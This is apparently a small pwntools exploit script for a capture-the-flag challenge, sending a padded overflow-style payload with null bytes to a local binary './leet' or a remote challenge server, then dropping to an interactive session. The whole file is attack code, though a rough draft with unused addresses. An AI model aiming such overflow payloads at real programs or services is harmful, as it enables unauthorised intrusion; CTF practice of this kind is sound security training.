from pwn import *

local = True

main_addr = 0x804921d
counter_addr = 0x804c040

if local:
    p = process("./leet")
    input("gdb")
else:
    p = remote("0.cloud.chals.io", 26008)

m = p.recv()

payload = b"AAAABBBB" + b"\x00\x00\x00\x00" + b"CCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT"

p.sendline(payload)

p.interactive()
